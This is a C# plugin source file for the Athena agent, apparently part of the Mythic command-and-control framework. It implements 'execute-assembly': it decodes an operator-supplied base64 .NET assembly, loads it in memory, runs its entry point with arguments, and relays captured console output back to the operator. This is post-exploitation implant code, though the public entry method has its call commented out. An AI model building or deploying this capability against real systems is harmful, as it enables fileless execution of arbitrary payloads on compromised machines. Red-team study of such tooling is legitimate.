﻿using Athena.Plugins;
using System.Runtime.Loader;
using System.Text;

namespace Plugin
{
    public static class executeassembly
    {



        //*************
        // For some reason this refuses to properly print newlines
        //*************
        
        private static bool assemblyIsRunning = false;
        public static string assemblyTaskId = "";
        private static AssemblyLoadContext executeAssemblyContext = new AssemblyLoadContext(Guid.NewGuid().ToString(), true);
        private static ConsoleWriter executeAssemblyWriter;
        public static void Execute(Dictionary<string, object> args)
        {
            //ExecuteAssembly(args);
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        private static void ExecuteAssembly(Dictionary<string, object> args) //How do I deal with  now?
        {
            //Backup the original StdOut
            var origStdOut = Console.Out;
            if (assemblyIsRunning)
            {
                PluginHandler.AddResponse(new ResponseResult()
                {
                    completed = "true",
                    user_output = "An assembly is already executing.!",
                    task_id = (string)args["task-id"],
                });
                return;
            }

            ExecuteAssemblyTask ea = new ExecuteAssemblyTask()
            {
                asm = (string)args["asm"],
                arguments = (string)args["arguments"],
            };

            //Indicating an execute-assembly task is running.
            assemblyIsRunning = true;
            assemblyTaskId = (string)args["task-id"];

            //Add an alert for when the assembly is finished executing
            try
            {
                using (executeAssemblyWriter = new ConsoleWriter())
                {
                    //Capture StdOut
                    Console.SetOut(executeAssemblyWriter);
                    executeAssemblyWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                    executeAssemblyWriter.WriteEvent += consoleWriter_WriteEvent;;

                    //Load the Assembly
                    var assembly = executeAssemblyContext.LoadFromStream(new MemoryStream(Base64DecodeToByteArray(ea.asm)));

                    //Invoke the Assembly
                    assembly.EntryPoint.Invoke(null, new object[] { SplitCommandLine(ea.arguments) }); //I believe  blocks until it's finished
                    
                    //Return StdOut back to original location
                    Console.SetOut(origStdOut);
                }

                assemblyIsRunning = false;

                PluginHandler.Write(Environment.NewLine + "Finished Executing.", assemblyTaskId, true);
            }
            catch (Exception e)
            {
                assemblyIsRunning = false;
                Console.SetOut(origStdOut);
                PluginHandler.Write(Environment.NewLine + e.ToString(), assemblyTaskId, true, "error");
            }
        }
        private class ExecuteAssemblyTask
        {
            public string asm;
            public string arguments;
        }
        private static byte[] Base64DecodeToByteArray(string base64EncodedData)
        {
            return Convert.FromBase64String(base64EncodedData);
        }
        private static string[] SplitCommandLine(string str)
        {
            var retval = new List<string>();
            if (String.IsNullOrWhiteSpace(str)) return retval.ToArray();
            int ndx = 0;
            string s = String.Empty;
            bool insideDoubleQuote = false;
            bool insideSingleQuote = false;

            while (ndx < str.Length)
            {
                if (str[ndx] == ' ' && !insideDoubleQuote && !insideSingleQuote)
                {
                    if (!String.IsNullOrWhiteSpace(s.Trim())) retval.Add(s.Trim());
                    s = String.Empty;
                }
                if (str[ndx] == '"') insideDoubleQuote = !insideDoubleQuote;
                if (str[ndx] == '\'') insideSingleQuote = !insideSingleQuote;
                s += str[ndx];
                ndx++;
            }
            if (!String.IsNullOrWhiteSpace(s.Trim())) retval.Add(s.Trim());
            return retval.ToArray();
        }
        public class ConsoleWriterEventArgs : EventArgs
        {
            public string Value { get; private set; }
            public ConsoleWriterEventArgs(string value)
            {
                Value = value;
            }
        }
        public class ConsoleWriter : TextWriter
        {
            public override Encoding Encoding { get { return Encoding.UTF8; } }

            public override void Write(string value)
            {
                if (WriteEvent is not null) WriteEvent(this, new ConsoleWriterEventArgs(value));
                base.Write(value);
            }

            public override void WriteLine(string value)
            {
                if (WriteLineEvent is not null) WriteLineEvent(this, new ConsoleWriterEventArgs(value));
                base.WriteLine(value);
            }

            public event EventHandler<ConsoleWriterEventArgs> WriteEvent;
            public event EventHandler<ConsoleWriterEventArgs> WriteLineEvent;
        }
        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            if(e is null || e.Value is null)
            {
                return;
            }
                PluginHandler.Write(e.Value + Environment.NewLine, assemblyTaskId, true);
        }
        static void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
        {
            if (e is null || e.Value is null)
            {
                return;
            }
            PluginHandler.Write(e.Value, assemblyTaskId, true);
        }
    }


}
